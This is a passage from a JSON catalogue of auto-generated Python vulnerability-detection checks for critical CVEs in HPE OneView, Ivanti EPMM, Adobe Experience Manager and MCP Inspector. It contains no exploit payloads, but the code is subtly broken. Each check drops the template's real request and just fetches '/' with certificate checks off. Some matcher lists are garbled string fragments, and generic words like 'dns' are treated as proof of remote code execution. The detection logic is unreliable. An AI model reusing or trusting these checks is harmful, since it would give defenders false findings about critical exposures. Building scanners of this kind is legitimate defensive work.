headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'ExecutableCommand' | mot(s) 'dns' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['ExecutableCommand', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HPE OneView - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_37164(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "hpe",
          "oneview",
          "rce",
          "vkev",
          "kev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_4427",
        "name": "Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "An authentication bypass in Ivanti Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials. This leads to unauthenticated Remote Code Execution via unsafe userinput in one of the bean validators which is sink for Server-Side Template Injection.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'localizedMessage' | regex [\"Format 'Process\\\\[pid=\", \"Format 'java\\\\.lang\\\\.UNIXProcess@[0-9a-f]+'\"] | mot(s) 'dns' | status HTTP [400]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-4427\nName: Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: An authentication bypass in Ivanti Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials. This leads to unauthenticated Remote Code Execution via unsafe userinput in one of the bean validators which is sink for Server-Side Template Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_4427:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-4427\"\n    SEVERITY = \"critical\"\n    NAME = \"Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'localizedMessage\\' | regex [\"Format \\'Process\\\\\\\\[pid=\", \"Format \\'java\\\\\\\\.lang\\\\\\\\.UNIXProcess@[0-9a-f]+\\'\"] | mot(s) \\'dns\\' | status HTTP [400]'\n\n        # Simple word matcher simulation\n        matchers = ['localizedMessage', 'Process\\\\\\\\[pid=\", \"Format ', '\"] | mot(s) ']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_4427(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-4427\nName: Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: An authentication bypass in Ivanti Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials. This leads to unauthenticated Remote Code Execution via unsafe userinput in one of the bean validators which is sink for Server-Side Template Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_4427:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-4427\"\n    SEVERITY = \"critical\"\n    NAME = \"Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'localizedMessage\\' | regex [\"Format \\'Process\\\\\\\\[pid=\", \"Format \\'java\\\\\\\\.lang\\\\\\\\.UNIXProcess@[0-9a-f]+\\'\"] | mot(s) \\'dns\\' | status HTTP [400]'\n\n        # Simple word matcher simulation\n        matchers = ['localizedMessage', 'Process\\\\\\\\[pid=\", \"Format ', '\"] | mot(s) ']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_4427(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2025-4427"
        ],
        "tags": [
          "cve",
          "cve2025",
          "ivanti",
          "epmm",
          "rce",
          "ssti",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 5.3
      },
      {
        "id": "fn_nuclei_c_v_e_2025_49533",
        "name": "Adobe Experience Manager Forms - Insecure Deserialization",
        "language": "Python",
        "famille": "CVE",
        "description": "Adobe Experience Manager versions 6.5.23 and earlier are affected by a Misconfiguration vulnerability that could result in arbitrary code execution. An attacker could leverage this vulnerability to bypass security mechanisms and execute code. Exploitation of this issue does not require user interaction and scope is changed.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body, \"<title>Adobe Experience Manager forms</title>\") / [OR] DSL: contains(body, 'InvocationTargetException'); status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-49533\nName: Adobe Experience Manager Forms - Insecure Deserialization\nSeverity: critical\nDescription: Adobe Experience Manager versions 6.5.23 and earlier are affected by a Misconfiguration vulnerability that could result in arbitrary code execution. An attacker could leverage this vulnerability to bypass security mechanisms and execute code. Exploitation of this issue does not require user interaction and scope is changed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_49533:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-49533\"\n    SEVERITY = \"critical\"\n    NAME = \"Adobe Experience Manager Forms - Insecure Deserialization\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"<title>Adobe Experience Manager forms</title>\") / [OR] DSL: contains(body, \\'InvocationTargetException\\'); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['InvocationTargetException']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Adobe Experience Manager Forms - Insecure Deserialization\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_49533(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-49533\nName: Adobe Experience Manager Forms - Insecure Deserialization\nSeverity: critical\nDescription: Adobe Experience Manager versions 6.5.23 and earlier are affected by a Misconfiguration vulnerability that could result in arbitrary code execution. An attacker could leverage this vulnerability to bypass security mechanisms and execute code. Exploitation of this issue does not require user interaction and scope is changed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_49533:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-49533\"\n    SEVERITY = \"critical\"\n    NAME = \"Adobe Experience Manager Forms - Insecure Deserialization\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"<title>Adobe Experience Manager forms</title>\") / [OR] DSL: contains(body, \\'InvocationTargetException\\'); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['InvocationTargetException']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Adobe Experience Manager Forms - Insecure Deserialization\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_49533(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "aem",
          "adobe",
          "rce",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_49596",
        "name": "MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "The MCP inspector is a developer tool for testing and debugging MCP servers. Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(body,\"MCP Inspector\") / [OR] DSL: status_code == 200; compare_versions(version, '< 0.14.0') / [OR] DSL: contains_all(body,\"endpoint\",\"/message?sessionId=\"); status_code == 200",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-49596\nName: MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\nSeverity: critical\nDescription: The MCP inspector is a developer tool for testing and debugging MCP servers. Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_49596:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-49596\"\n    SEVERITY = \"critical\"\n    NAME = \"MCP Inspector < 0.14.0 UnauthenticatedRemote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = 